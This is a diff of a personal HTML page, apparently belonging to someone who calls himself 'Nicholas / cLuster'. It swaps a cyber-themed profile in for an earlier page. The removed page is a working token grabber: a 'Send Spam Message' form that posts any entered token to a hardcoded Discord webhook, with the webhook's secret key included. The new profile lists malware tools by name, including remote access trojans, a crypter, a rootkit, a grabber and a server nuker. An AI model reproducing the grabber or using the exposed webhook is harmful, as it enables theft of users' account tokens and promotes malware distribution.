@@ -1,45 +1,237 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>Spam</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nicholas | Cyber Profile</title>
+
+<link rel="icon" href="https://i.imgur.com/QtANjeR.png">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;700&display=swap" rel="stylesheet">
+
+<style>
+:root{
+  --bg:#0a0f1f;
+  --neon:#00f7ff;
+  --pink:#ff00c8;
+  --glass:rgba(255,255,255,0.05);
+}
+
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:'Inter';
+  background:radial-gradient(circle at top, #0f172a, #020617);
+  color:#fff;
+}
+
+/* HERO */
+.hero{
+  height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  flex-direction:row-reverse;
+  gap:40px;
+  padding:20px;
+}
+
+.avatar{
+  width:180px;
+  height:180px;
+  border-radius:12px;
+  border:2px solid var(--neon);
+  box-shadow:0 0 40px var(--neon);
+  background:url('https://i.imgur.com/8FG98cF.jpeg') center/cover;
+}
+
+.hero-text{
+  max-width:500px;
+}
+
+.hero h1{
+  font-family:'Orbitron';
+  font-size:40px;
+}
+
+.hero p{
+  color:#aaa;
+  margin-top:10px;
+  line-height:1.6;
+}
+
+.section{
+  padding:60px 20px;
+}
+
+.card{
+  background:var(--glass);
+  backdrop-filter:blur(12px);
+  border:1px solid rgba(255,255,255,0.1);
+  border-radius:20px;
+  padding:30px;
+  margin-bottom:30px;
+  transition:.3s;
+}
+
+.card:hover{
+  transform:translateY(-10px);
+  box-shadow:0 0 30px rgba(0,255,255,0.2);
+}
+
+h2{
+  margin-bottom:20px;
+  color:var(--neon);
+}
+
+.skill{
+  margin-bottom:15px;
+}
+.bar{
+  height:10px;
+  background:#111;
+  border-radius:20px;
+  overflow:hidden;
+}
+.bar span{
+  display:block;
+  height:100%;
+  background:linear-gradient(90deg,var(--neon),var(--pink));
+}
+
+.tools{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
+  gap:15px;
+}
+
+.tool{
+  padding:15px;
+  text-align:center;
+  border-radius:12px;
+  background:#050816;
+  border:1px solid rgba(0,255,255,0.1);
+}
+
+/* CONTACT */
+.contact-box{
+  display:flex;
+  gap:20px;
+  flex-wrap:wrap;
+}
+
+.contact-card{
+  display:flex;
+  align-items:center;
+  gap:15px;
+  background:#050816;
+  padding:15px;
+  border-radius:14px;
+  border:1px solid rgba(255,255,255,0.1);
+  flex:1;
+}
+
+.contact-card img{
+  width:50px;
+  height:50px;
+}
+
+.contact-info a{
+  color:var(--neon);
+  display:block;
+  margin-top:5px;
+}
+
+footer{
+  text-align:center;
+  padding:20px;
+  color:#666;
+}
+</style>
 </head>
-<body style="font-family: Arial; text-align:center; margin-top:100px;">
 
-  <h2>Send Spam Message</h2>
+<body>
 
-  <input id="token" type="text" placeholder="Token" style="padding:10px; width:250px;">
-  <br><br>
+<div class="hero">
+  <div class="avatar"></div>
 
-  <button onclick="sendToken()" style="padding:10px 20px;">Send</button>
+  <div class="hero-text">
+    <h1>Nicholas / cLuster</h1>
+    <p>im the one who makes moves</p>
+  </div>
+</div>
 
-  <script>
-    const webhookURL = "https://discord.com/api/webhooks/1495044184694849587/Ylq8QM-J3UkH_2Hwm6o9u11QzlNMj_SyTilhOTEH2xQSoCVIqG8hYM37a9PU5mq3_JqR";
+<div class="section">
 
-    function sendToken() {
-      const token = document.getElementById("token").value;
+  <div class="card">
+    <h2>Skills</h2>
 
-      fetch(webhookURL, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          content: "Token: " + token
-        })
-      })
-      .then(res => {
-        if (res.ok) {
-          alert("Sent successfully!");
-        } else {
-          alert("Error sending!");
-        }
-      })
-      .catch(err => {
-        alert("Request failed!");
-      });
-    }
-  </script>
+    <div class="skill">Python
+      <div class="bar"><span style="width:90%"></span></div>
+    </div>
+
+    <div class="skill">C++
+      <div class="bar"><span style="width:84%"></span></div>
+    </div>
+
+    <div class="skill">C#
+      <div class="bar"><span style="width:65%"></span></div>
+    </div>
+
+    <div class="skill">JavaScript
+      <div class="bar"><span style="width:53%"></span></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Tools</h2>
+    <div class="tools">
+      <div class="tool">Discord Server Nuker</div>
+      <div class="tool">Crypter</div>
+      <div class="tool">RootKit</div>
+      <div class="tool">XWorm</div>
+      <div class="tool">Webhook Manager</div>
+      <div class="tool">Nicholas Obfuscator</div>
+      <div class="tool">XBinder</div>
+      <div class="tool">XGrabber</div>
+      <div class="tool">Big Shark</div>
+      <div class="tool">Neptune Rat</div>
+      <div class="tool">RCE Generator</div>
+      <div class="tool">Dangerous RAT</div>
+      <div class="tool">Wiz Worm</div>
+      <div class="tool">QuasarRat</div>
+      <div class="tool">Xworm Exploit</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Contact</h2>
+
+    <div class="contact-box">
+
+      <div class="contact-card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/09/YouTube_full-color_icon_%282017%29.svg">
+        <div class="contact-info">
+          <div>YouTube</div>
+          <a href="https://www.youtube.com/@invistigation" target="_blank">@invistigation</a>
+        </div>
+      </div>
+
+      <div class="contact-card">
+        <img src="https://assets.guns.lol/guns_logo_no_background_cropped.png">
+        <div class="contact-info">
+          <div>guns.lol</div>
+          <a href="https://guns.lol/wi" target="_blank">@wi</a>
+        </div>
+      </div>
+
+    </div>
+
+  </div>
+
+</div>
+
+<footer>
+  Â© Nicholas
+</footer>
 
 </body>
 </html>
